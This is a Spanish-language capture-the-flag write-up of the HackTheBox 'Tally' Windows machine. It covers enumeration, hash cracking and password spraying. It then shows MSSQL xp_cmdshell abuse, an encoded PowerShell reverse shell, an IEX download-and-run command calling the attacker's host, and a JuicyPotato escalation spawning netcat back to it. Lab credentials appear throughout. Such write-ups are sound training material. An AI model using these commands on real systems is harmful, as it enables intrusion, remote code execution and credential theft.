---
title: "Tally - WriteUp"
date: Tue Apr 01 2025 17:15:00 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Windows]
tags: [ctf, nmap, htb, powershell, exploit, mssql, mysql, bash, smb, wfuzz]
image: /assets/img/htb-writeups/Pasted image 20240222190040.png
---

{% include machine-info.html
  machine="Tally"
  os="Windows"
  difficulty="Hard"
  platform="HTB"
%}

![Tally](/assets/img/htb-writeups/Pasted image 20240222190040.png)

Tags:             

-----

![TALLY](/assets/img/htb-writeups/Pasted image 20240222190040.png)

Tally puede ser una máquina muy desafiante para algunos. Se centra en muchos aspectos diferentes de los entornos reales de Windows y requiere que los usuarios modifiquen y compilen un exploit para escalarlo. En este documento no se cubre el uso de Rotten Potato, que es un método alternativo no intencionado para la escalada de privilegios.

------

#### ENUM

NMAP
```perl
# Nmap 7.94SVN scan initiated Thu Feb 22 19:03:41 2024 as: nmap -sCV -p 21,80,81,135,139,445,808,1433,5985,15567,32843,32846,47001,49664,49665,49666,49667,49668,49670 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 10.129.1.183
Nmap scan report for 10.129.1.183
Host is up (0.046s latency).

PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-title: Home
|_Requested resource was http://10.129.1.183/_layouts/15/start.aspx#/default.aspx
| http-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
| http-vulners-regex: 
|   /main.html: 
|     cpe:/a:microsoft:iis:10.0
|     cpe:/a:microsoft:sharepoint:15.0.0.4420
|   /default.aspx: 
|_    cpe:/a:microsoft:asp.net:4.0.30319
|_http-server-header: Microsoft-IIS/10.0
|_http-generator: Microsoft SharePoint
81/tcp    open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Bad Request
|_http-server-header: Microsoft-HTTPAPI/2.0
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
808/tcp   open  ccproxy-http?
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2016 13.00.1601.00; RTM
| ms-sql-info: 
|   10.129.1.183:1433: 
|     Version: 
|       name: Microsoft SQL Server 2016 RTM
|       number: 13.00.1601.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.1.183:1433: 
|     Target_Name: TALLY
|     NetBIOS_Domain_Name: TALLY
|     NetBIOS_Computer_Name: TALLY
|     DNS_Domain_Name: TALLY
|     DNS_Computer_Name: TALLY
|_    Product_Version: 10.0.14393
|_ssl-date: 2024-02-22T18:05:06+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-02-22T18:01:08
|_Not valid after:  2054-02-22T18:01:08
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
15567/tcp open  http               Microsoft IIS httpd 10.0
| http-vulners-regex: 
|   /main.html: 
|     cpe:/a:microsoft:iis:10.0
|_    cpe:/a:microsoft:sharepoint:15.0.0.4420
| http-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
|_http-title: Site doesnt have a title.
32843/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
32846/tcp open  storagecraft-image StorageCraft Image Manager
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc              Microsoft Windows RPC
49665/tcp open  msrpc              Microsoft Windows RPC
49666/tcp open  msrpc              Microsoft Windows RPC
49667/tcp open  msrpc              Microsoft Windows RPC
49668/tcp open  msrpc              Microsoft Windows RPC
49670/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-22T18:04:42
|_  start_date: 2024-02-22T18:00:50
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

HTTP
![TALLY](/assets/img/htb-writeups/Pasted image 20240222203352.png)

Estamos ante un servidor SharePoint. Necesitamos credenciales.

FUZZING
```bash
$ wfuzz -c -t 200 -w /usr/share/seclists/Discovery/Web-Content/CMS/sharepoint.txt --hc 404,302,500 --hl 160 "http://10.129.1.183/FUZZ"
```

Encontramos varias rutas útiles:

```http
SHAREPOINT
http://10.129.1.183/_catalogs/masterpage/forms/allitems.aspx
http://10.129.1.183/shared%20documents/forms/allitems.aspx
http://10.129.1.183/_catalogs/wp/forms/allitems.aspx
http://10.129.1.183/SitePages/Forms/AllPages.aspx
```

Nos llama la atención esta ruta y nos bajamos el contenido.

![TALLY](/assets/img/htb-writeups/Pasted image 20240222204551.png)

![TALLY](/assets/img/htb-writeups/Pasted image 20240222204621.png)

Tenemos una contraseña.

```http
UTDRSCH53c"$6hys
```

Otras rutas de interés:

```http
http://10.129.1.183/SitePages/Forms/AllPages.aspx
```

![TALLY](/assets/img/htb-writeups/Pasted image 20240223105336.png)

Si hacemos hovering en el enlace de l documento vemos que nos lleva a http://10.129.1.183/SitePages/FinanceTeam.aspx, no pinchemos directamente porque nos redirige a otro sitio.

![TALLY](/assets/img/htb-writeups/Pasted image 20240223105603.png)

Si leemos con atención nos dice que usemos el usuario _ftp_user_

Pues parece que tenemos credenciales completas para el server FTP

```http
ftp_user:UTDRSCH53c"$6hys
```

Vamos a probar las credenciales con _crackmapexec_:

```bash
$ crackmapexec ftp 10.129.1.183 -u users.txt -p 'UTDRSCH53c"$6hys'
FTP         10.129.1.183    21     10.129.1.183     [*] Banner: Microsoft FTP Service
FTP         10.129.1.183    21     10.129.1.183     [+] ftp_user:UTDRSCH53c"$6hys

$ crackmapexec smb 10.129.1.183 -u users.txt -p 'UTDRSCH53c"$6hys' --shares
SMB         10.129.1.183    445    TALLY            [*] Windows Server 2016 Standard 14393 x64 (name:TALLY) (domain:TALLY) (signing:False) (SMBv1:True)
SMB         10.129.1.183    445    TALLY            [+] TALLY\ftp_user:UTDRSCH53c"$6hys 
SMB         10.129.1.183    445    TALLY            [+] Enumerated shares
SMB         10.129.1.183    445    TALLY            Share           Permissions     Remark
SMB         10.129.1.183    445    TALLY            -----           -----------     ------
SMB         10.129.1.183    445    TALLY            ACCT                            
SMB         10.129.1.183    445    TALLY            ADMIN$                          Remote Admin
SMB         10.129.1.183    445    TALLY            C$                              Default share
SMB         10.129.1.183    445    TALLY            IPC$                            Remote IPC
```

Conectamos por FTP ayudándonos del cliente _filezilla_ o también podemos crear una carpeta en /mnt y mapear todo le contenido de FTP ahí de la siguiente manera:

```bash
$ curlftpfs 10.129.1.183 /mnt/ftp -o user=ftp_user:'UTDRSCH53c"$6hys'
```

Encontramos una lista de usuario y sus carpetas, entre otras. Nos los descargamos todos y apuntamos los nombres de usuario.

![TALLY](/assets/img/htb-writeups/Pasted image 20240223112409.png)

Vamos a explorar todos los archivos descargados.

Dentro de la carpeta de _tim_ encontramos una BBDD de _keepass_:

![TALLY](/assets/img/htb-writeups/Pasted image 20240223113832.png)

Vamos a por la BBDD de Keepass:

```bash
$ keepass2john tim.kdbx

tim:$keepass$*2*6000*0*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
```

Copiamos el hash en una archivo y le pasamos john:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash-keepass

Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
simplementeyo    (tim)     
1g 0:00:00:12 DONE (2024-02-23 11:41) 0.07886g/s 1948p/s 1948c/s 1948C/s simplementeyo..rylee
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Y obtenemos la contraseña:

```http
KEEPASS 
simplementeyo
```

Abrimos la BBDD con la contraseña obtenida y vemos lo siguiente:

![TALLY](/assets/img/htb-writeups/Pasted image 20240223114656.png)

![TALLY](/assets/img/htb-writeups/Pasted image 20240223114715.png)

![TALLY](/assets/img/htb-writeups/Pasted image 20240223114738.png)

Apuntamos todo y sobre todo las credenciales:

```http
KEEPASS
finance:Acc0unting
cisco:cisco123
64257-56525-54257-54734
```

Hacemos password spraying y obtenemos dos credenciales válidas, una de ellas nueva:

```bash
$ crackmapexec smb 10.129.1.183 -u users.txt -p passwords.txt --continue-on-success
...
SMB         10.129.1.183    445    TALLY            [+] TALLY\ftp_user:UTDRSCH53c"$6hys
SMB         10.129.1.183    445    TALLY            [+] TALLY\finance:Acc0unting 
```

Probamos los permisos del usuario _finance_ contra el servidor de archivos:

```bash
crackmapexec smb 10.129.1.183 -u 'finance' -p 'Acc0unting' --shares

SMB         10.129.1.183    445    TALLY            [*] Windows Server 2016 Standard 14393 x64 (name:TALLY) (domain:TALLY)
SMB         10.129.1.183    445    TALLY            [+] TALLY\finance:Acc0unting 
SMB         10.129.1.183    445    TALLY            [+] Enumerated shares
SMB         10.129.1.183    445    TALLY            Share           Permissions     Remark
SMB         10.129.1.183    445    TALLY            -----           -----------     ------
SMB         10.129.1.183    445    TALLY            ACCT            READ            
SMB         10.129.1.183    445    TALLY            ADMIN$                          Remote Admin
SMB         10.129.1.183    445    TALLY            C$                              Default share
SMB         10.129.1.183    445    TALLY            IPC$                            Remote IPC
```

Tenemos permisos de lectura en la carpeta ACCT, vamos a conectar vía Thunar porque nos resultará mucho más fácil navegar:

```bash
smb://10.129.1.183/ACCT
```

![TALLY](/assets/img/htb-writeups/Pasted image 20240223120255.png)

Podemos hacerlo también montando la unidad compartida con _mount_:

```bash
$ mount -t cifs //10.129.143.199/ACCT /mnt/smb -o username=Finance,password=Acc0unting,rw
```

Descubrimos que Tally es un ERP V9

Nos copiamos los archivos que hemos visto más relevantes:

![TALLY](/assets/img/htb-writeups/Pasted image 20240223122126.png)

Vamos a explorar uno por uno.

Descubrimos lo siguiente en el archivo "conn-info.txt"

```
old server details

db: sa
pass: YE%TJC%&HYbe5Nw

have changed for tally
```

El archivo "orchaddb.zip" contiene un archivo SQL pero está protegido con contraseña. Vamos a romperlo para ver el contenido.

```bash
$ zip2john orcharddb.zip > hashzip
ver 2.0 orcharddb.zip/orcharddb.sql PKZIP Encr: cmplen=852, decmplen=3688, crc=AAC50291 ts=772E cs=aac5 type=8
...
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashzip

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Acc0unting       (orcharddb.zip/orcharddb.sql)     
1g 0:00:00:01 DONE (2024-02-23 12:31) 0.8547g/s 9781Kp/s 9781Kc/s 9781KC/s Adi12be..ASIANGIRLS
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

La contraseña es "Acc0unting"

Lo descomprimimos y visualizamos su contenido.

![TALLY](/assets/img/htb-writeups/Pasted image 20240223130017.png)

Tenemos el password de admin...

```http
admin:Finance2
```

También encontramos un binario sospechoso en la ruta "smb://10.129.143.199/acct/zz_Migration/Binaries/Newfolder/" llamado "tester.exe"

Vamos a ver lo que contiene con _strings_:

![TALLY](/assets/img/htb-writeups/Pasted image 20240223135347.png)

Y obtenemos otras credenciales! parece que es del servidor MSSQL. Las apuntamos.

```http
GWE3V65#6KFH93@4GWTG2G
```

```bash
$ impacket-mssqlclient -p 1433 sa@TALLY
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(TALLY): Line 1: Changed database context to 'master'.
[*] INFO(TALLY): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 665) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> 
```

Una vez dentro, habilitamos la ejecución de comandos:

```SQL
sp_configure 'show advanced options', '1'
RECONFIGURE
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```

Vamos a ver quiénes somos:

```SQL
SQL (sa  dbo@msdb)> EXEC master..xp_cmdshell 'whoami'
output        
-----------   
tally\sarah   
```

Somo el usuario Sarah. Vamos a intentar coger el hash, si no, intentaremos una reverse shell directamente:

```bash
$ sudo impacket-smbserver share ./ -smb2support
```

```SQL
EXEC xp_dirtree '\\10.10.14.131\remote', 1, 1;
```

![TALLY](/assets/img/htb-writeups/Pasted image 20240223141517.png)

Pasamos _john_...
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash-sarah

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:07 DONE (2024-02-23 14:15) 0g/s 2025Kp/s 2025Kc/s 2025KC/s !)(OPPQR..*7¡Vamos!
Session completed. 
```

Pero no podemos. Así que toca enviar una reverse shell...

Preparamos un payload en base64 configurando nuestra IP y el puerto de escucha que queramos en https://www.revshells.com/ y le daremos el nombre de _reverse.ps1_

Este es el contenido en mi caso:

```bash
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAzADEAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

Nos levantaremos un servidor HTTP por el puerto 8000 para que la máquina víctima nos coja el archivo del payload PS1:

```bash
$ python3 -m http.server 8000
```

Ahora en una tercera terminal nos pondremos a la escucha con _rlwrap_ y _netcat_ para recibir la shell:

```bash
$ sudo rlwrap -cAr nc -lvnp 443
```

Y por último ejecutaremos el siguiente comando en la consola mssql:

```MySQL
SQL (sa  dbo@master)> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.131:8000/reverse.ps1") | powershell -noprofile'
```

![TALLY](/assets/img/htb-writeups/Pasted image 20240223144742.png)

Y conseguimos entrar...

Registramos la bandera de user sita en el escritorio de Sarah y seguimos.

![TALLY](/assets/img/htb-writeups/Pasted image 20240223145047.png)

```http
sarah:mylongandstrongp4ssword!
```

Vemos que el usuario tiene habilitado el permiso _SeImpersonatePrivilege_. Podríamos usar JuicyPotato para conseguir escalar privilegios.

Nos subimos juicypotato y el netcat y ejecutamos con una consola en espera:

```PowerShell
PS C:\temp> .\potato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\temp\nc.exe -e cmd 10.10.14.131 4444"
```
---

**Última actualización**: 2025-04-01<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
